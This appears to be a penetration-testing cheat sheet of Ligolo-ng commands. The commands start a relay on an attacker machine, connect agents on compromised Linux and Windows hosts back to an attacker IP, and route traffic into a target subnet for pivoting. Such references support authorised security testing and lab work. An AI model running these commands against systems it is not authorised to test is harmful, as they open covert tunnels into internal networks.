
---
Description :
     Ligolo-ng proxy — start relay on attacker (listen for agent)

Parameters : #attacker-ip #file

```cmd
./proxy -laddr {{attacker-ip}}:11601 -selfcert
```

```example
./proxy -laddr 0.0.0.0:11601 -selfcert
```

Tags :  #linux #ligolo #pivot #tunnel #toolkit

---

Description :
     Ligolo-ng agent — connect from compromised host to attacker relay

Parameters : #attacker-ip

```cmd
./agent -connect {{attacker-ip}}:11601 -ignore-cert
```

```example
./agent -connect 10.10.14.2:11601 -ignore-cert
```

Tags :  #linux #ligolo #pivot #agent #toolkit

---

Description :
     Ligolo-ng — add tun interface on attacker after session (inside proxy CLI)

Parameters :

```cmd
session
```

```example
session
```

Tags :  #linux #ligolo #pivot #toolkit

---

Description :
     Ligolo-ng — start tunnel for subnet via proxy CLI (example 10.10.10.0/24)

Parameters :

```cmd
tunnel_start --tun ligolo --subnet 10.10.10.0/24
```

```example
tunnel_start --tun ligolo --subnet 10.10.10.0/24
```

Tags :  #linux #ligolo #pivot #route #toolkit

---

Description :
     Add route on attacker OS to target subnet through ligolo tun (Linux)

Parameters :

```cmd
sudo ip route add 10.10.10.0/24 dev ligolo
```

```example
sudo ip route add 10.10.10.0/24 dev ligolo
```

Tags :  #linux #ligolo #pivot #ip-route #toolkit

---

Description :
     Ligolo-ng agent Windows connect

Parameters : #attacker-ip

```cmd
agent.exe -connect {{attacker-ip}}:11601 -ignore-cert
```

```example
agent.exe -connect 10.10.14.2:11601 -ignore-cert
```

Tags :  #windows #ligolo #pivot #toolkit

---
